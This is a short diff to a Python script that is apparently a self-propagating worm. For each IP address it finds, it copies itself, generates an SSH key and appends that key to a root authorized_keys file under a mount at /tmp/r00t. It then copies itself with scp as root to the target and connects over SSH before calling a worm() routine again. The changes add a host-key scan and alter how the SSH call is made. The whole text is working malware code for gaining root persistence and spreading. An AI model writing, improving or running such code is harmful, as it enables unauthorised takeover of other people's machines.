@@ -42,6 +42,7 @@ def main():
         for ip in ssh():
             os.makedirs('/lotus', exist_ok = True)
             subprocess.run(['cp -r ./* /lotus'], shell=True)
+            subprocess.run(['ssh-keyscan ' + str(ip) + '>> ~/.ssh/known_hosts'], shell=True)
             proc = subprocess.Popen(['ssh-keygen -t rsa -f ~/.ssh/id_rsa'],stdout=PIPE, stdin=PIPE, shell=True)
             proc.communicate(input=base64.encodebytes('y'.encode()))
             os.makedirs('/tmp/r00t', exist_ok = True)
@@ -49,6 +50,6 @@ def main():
             subprocess.run(['cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys'], shell=True)
             subprocess.run(['umount /tmp/r00t'], shell=True)
             subprocess.run(['scp -r ~/lotus root@' + str(ip) + ':/'], shell=True)
-            subprocess.run(['ssh root@'  + str(ip)], shell=True)         
+            subprocess.call(["ssh", "root@" + str(ip)])
     worm()
 main()
